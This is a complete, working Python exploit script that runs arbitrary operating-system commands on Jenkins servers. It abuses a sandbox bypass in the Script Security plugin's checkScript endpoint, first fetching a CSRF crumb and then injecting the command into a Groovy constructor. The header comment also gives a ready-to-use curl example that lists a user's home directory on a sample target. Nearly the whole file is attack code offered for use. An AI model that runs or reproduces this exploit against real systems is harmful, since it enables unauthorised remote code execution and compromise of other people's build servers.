#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==============================================================================
# File:         jenkins-checkscript-rce.py
# Author:       Cashiuus
# Created:      10-Sep-2021     -     Revised:
#
# Depends:      requests, urllib3
# Compat:       3.7+
#
#-[ Usage ]---------------------------------------------------------------------
#
#
#   Example curl to manually test a site:
#       curl -k -4 -X POST "http://10.10.110.102:8080/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){def proc="ls -al /home/lucian/".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}' -H 'Jenkins-Crumb:2dfbaca9596a1bcbcf54a1101591e827'
#
# ==============================================================================
__version__ = '1.0.0'
__author__ = 'Cashiuus'
__license__ = 'MIT'
__copyright__ = 'Copyright (C) 2021 Cashiuus'

## =======[ IMPORT & CONSTANTS ]========= ##
import argparse
import errno
import json
import re
import sys
from random import randrange
from time import sleep, strftime

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

## =========[  TEXT COLORS  ]============= ##
class Colors(object):
    """ Access these via 'Colors.GREEN'   """
    GREEN = '\033[32;1m'    # Green
    YELLOW = '\033[01;33m'  # Warnings/Information
    RED = '\033[31m'        # Error or '\033[91m'
    ORANGE = '\033[33m'     # Debug
    BLUE = '\033[01;34m'    # Heading
    PURPLE = '\033[01;35m'  # Other
    GREY = '\e[90m'         # Subdued Text
    BOLD = '\033[01;01m'    # Highlight
    RESET = '\033[00m'      # Normal/White
    BACKBLUE = '\033[44m'   # Blue background
    BACKCYAN = '\033[46m'   # Cyan background
    BACKRED = '\033[41m'    # Red background
    BACKWHITE = '\033[47m'  # White background


# ==========================[ BEGIN APPLICATION ]========================== #


# ---------------------
#       SHUTDOWN
# ---------------------
def shutdown_app():
    #logger.debug("shutdown_app :: Application shutdown function executing")
    print("Application shutting down -- Goodbye!")
    exit(0)

# ---------------------
#   main
# ---------------------
def main():
    """
    Execute commands against a Jenkins server vulnerable to checkscript bypass

    """
    # -- arg parsing --
    parser = argparse.ArgumentParser(description = 'Jenkins Checkscript Command Execution Tool')
    parser.add_argument('url', type=str, help='Target base URL w/o trailing slash')
    parser.add_argument('-c', '--command', type=str, required=True)

    args = parser.parse_args()
    URL = args.url
    if URL.endswith('/'):
        URL = URL.rstrip('/')

    TAIL = '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/'

    DATA = {'sandbox':'True', 'value':'class abcd{{abcd(){{def proc="{0}".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}}}'.format(args.command)}

    # 1. Get Jenkins-Crumb to pass with headers first
    req = requests.get('{}/crumbIssuer/api/json'.format(URL))
    #print(req.text)
    #print(req.json())
    j = req.json()
    crumb = {j['crumbRequestField']: j['crumb']}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    headers.update(crumb)

    # 2. Send POST request with provided command to execute
    r = requests.post(URL + TAIL, data=DATA, headers=headers, verify=False)
    #print(r.text)

    m = re.search('java.lang.Exception:(.*)</pre>', r.text, flags=re.DOTALL)
    if m:
        print("\n\n{0}[ * ]{1} Jenkins stack trace response below should contain command output:".format(Colors.GREEN, Colors.RESET))
        print(m.group(1))
        print("\n\n---------------------------------\n\n")
    else:
        print('{0}[ERR]{1} Response text not found, something went wrong!'.format(Colors.RED, Colors.RESET))
    return


if __name__ == '__main__':
    main()
